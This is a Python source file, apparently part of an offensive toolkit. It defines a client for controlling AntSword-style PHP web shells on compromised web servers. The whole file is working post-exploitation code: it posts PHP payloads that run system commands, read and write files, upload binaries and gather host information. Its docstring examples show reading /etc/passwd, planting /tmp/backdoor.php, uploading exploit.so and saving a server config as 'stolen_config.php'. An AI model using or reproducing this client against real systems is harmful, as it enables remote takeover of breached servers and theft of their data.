"""Webshell client for communicating with deployed webshells."""

import base64
import logging

import httpx

from ofx.settings import settings

logger = logging.getLogger(settings.app_branding)


class WebShellClient:
    """HTTP client for interacting with deployed web shells.

    Provides a high-level interface for executing commands, file operations,
    and system information gathering on compromised web servers. Compatible
    with AntSword-style webshells.

    Attributes:
        url: Target webshell URL
        password: Password parameter name matching webshell
        encoder: Encoder type matching webshell configuration
        session: httpx.Client for persistent connections

    Example:
        >>> client = WebShellClient(
        ...     url='http://target.com/shell.php',
        ...     password='pass',
        ...     encoder='base64'
        ... )
        >>> client.run_command('whoami')
        'www-data'
        >>> files = client.list_directory('/var/www')
        >>> client.upload_file('payload.php', '/tmp/payload.php')
    """

    def __init__(
        self,
        url: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: str | None = None,
        secret_value: str | None = None,
        timeout: int = 30,
        verify_ssl: bool = True,
    ):
        """
        Initialize webshell client.

        Args:
            url: Webshell URL
            password: Password parameter name (must match webshell)
            encoder: Encoder type (must match webshell)
            secret_header: Optional authentication header name
            secret_value: Optional authentication header value
            timeout: Request timeout in seconds
            verify_ssl: Verify SSL certificates
        """
        self.url = url
        self.password = password
        self.encoder = encoder
        self.secret_header = secret_header
        self.secret_value = secret_value
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = httpx.Client(timeout=timeout, verify=verify_ssl)

    def _encode_payload(self, code: str) -> str:
        """Encode payload to match webshell's decoder.

        Args:
            code: Raw PHP/JSP/ASP code to encode

        Returns:
            Encoded payload string
        """
        if self.encoder == "base64":
            return base64.b64encode(code.encode()).decode()
        elif self.encoder == "default":
            return code
        else:
            return code

    def _build_headers(self) -> dict[str, str]:
        """Construct HTTP headers with optional secret header authentication.

        Returns:
            Dictionary of HTTP headers including User-Agent and secret auth
        """
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        if self.secret_header and self.secret_value:
            headers[self.secret_header] = self.secret_value
        return headers

    def execute(self, code: str, decode_response: bool = True) -> str:
        """
        Execute code on the webshell.

        Args:
            code: Code to execute
            decode_response: Decode base64 response (for base64 encoder)

        Returns:
            Response from webshell

        Example:
            >>> client = WebShellClient("http://target.com/shell.php", "pass")
            >>> result = client.execute("system('whoami');")
        """
        payload = self._encode_payload(code)
        data = {self.password: payload}
        headers = self._build_headers()

        try:
            response = self.session.post(self.url, data=data, headers=headers)
            response.raise_for_status()

            result = response.text

            if decode_response and self.encoder == "base64":
                try:
                    result = base64.b64decode(result).decode()
                except Exception:
                    pass

            return result

        except httpx.HTTPError as e:
            logger.error(f"HTTP error: {e}")
            raise

    def run_command(self, command: str) -> str:
        """Execute a system shell command on the target.

        Args:
            command: Shell command to execute (e.g., 'ls -la', 'whoami')

        Returns:
            Command output as string

        Example:
            >>> client.run_command('cat /etc/passwd')
            'root:x:0:0:root:/root:/bin/bash\n...'
        """
        code = f"system('{command}');"
        return self.execute(code)

    def read_file(self, file_path: str) -> str:
        """Read file contents from the target system.

        Args:
            file_path: Absolute or relative path to file

        Returns:
            File contents as string

        Example:
            >>> client.read_file('/etc/hostname')
            'webserver01'
        """
        code = f"echo file_get_contents('{file_path}');"
        return self.execute(code)

    def write_file(self, file_path: str, content: str) -> str:
        """Write content to a file on the target system.

        Args:
            file_path: Destination path on target
            content: String content to write

        Returns:
            Response from webshell (typically empty on success)

        Example:
            >>> client.write_file('/tmp/backdoor.php', '<?php phpinfo(); ?>')
            ''
        """
        encoded = base64.b64encode(content.encode()).decode()
        code = f"file_put_contents('{file_path}', base64_decode('{encoded}'));"
        return self.execute(code)

    def list_directory(self, directory: str = ".") -> list[str]:
        """List files and directories in a target directory.

        Args:
            directory: Path to directory (default: current directory)

        Returns:
            List of filenames/directory names

        Example:
            >>> client.list_directory('/var/www/html')
            ['index.php', 'config.php', 'uploads', '.htaccess']
        """
        code = f"echo implode('\\n', scandir('{directory}'));"
        result = self.execute(code)
        return [line.strip() for line in result.split("\n") if line.strip()]

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Download a file from the compromised server to local filesystem.

        Args:
            remote_path: Path to file on target server
            local_path: Local filesystem path to save file

        Example:
            >>> client.download_file('/var/www/config.php', './stolen_config.php')
            [INFO] Downloaded /var/www/config.php to ./stolen_config.php
        """
        content = self.read_file(remote_path)
        with open(local_path, "w") as f:
            f.write(content)
        logger.info(f"Downloaded {remote_path} to {local_path}")

    def upload_file(self, local_path: str, remote_path: str) -> str:
        """Upload a file from local filesystem to the compromised server.

        Args:
            local_path: Local filesystem path to file
            remote_path: Destination path on target server

        Returns:
            Response from webshell

        Example:
            >>> client.upload_file('./exploit.so', '/tmp/exploit.so')
            [INFO] Uploaded ./exploit.so to /tmp/exploit.so
            ''
        """
        with open(local_path, "rb") as f:
            content = f.read()
        encoded = base64.b64encode(content).decode()
        code = f"file_put_contents('{remote_path}', base64_decode('{encoded}'));"
        result = self.execute(code)
        logger.info(f"Uploaded {local_path} to {remote_path}")
        return result

    def get_system_info(self) -> dict[str, str]:
        """Retrieve system information from the target server.

        Gathers OS, hostname, current user, working directory, and PHP version.

        Returns:
            Dictionary with system information keys: 'os', 'hostname', 'user', 'cwd', 'php_version'

        Example:
            >>> info = client.get_system_info()
            >>> info
            {
                'os': 'Linux',
                'hostname': 'webserver01',
                'user': 'www-data',
                'cwd': '/var/www/html',
                'php_version': '7.4.3'
            }
        """
        code = """echo json_encode([
            'os' => PHP_OS,
            'hostname' => gethostname(),
            'user' => get_current_user(),
            'cwd' => getcwd(),
            'php_version' => phpversion()
        ]);"""
        result = self.execute(code)
        import json

        return json.loads(result)

    def test_connection(self) -> bool:
        """Test if webshell is reachable and working."""
        try:
            result = self.execute("echo 'OK';")
            return "OK" in result
        except Exception as e:
            logger.error(f"Connection test failed: {e}")
            return False

    def close(self) -> None:
        """Close the HTTP session."""
        self.session.close()

    def __enter__(self):
        """Context manager entry."""
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit."""
        self.close()
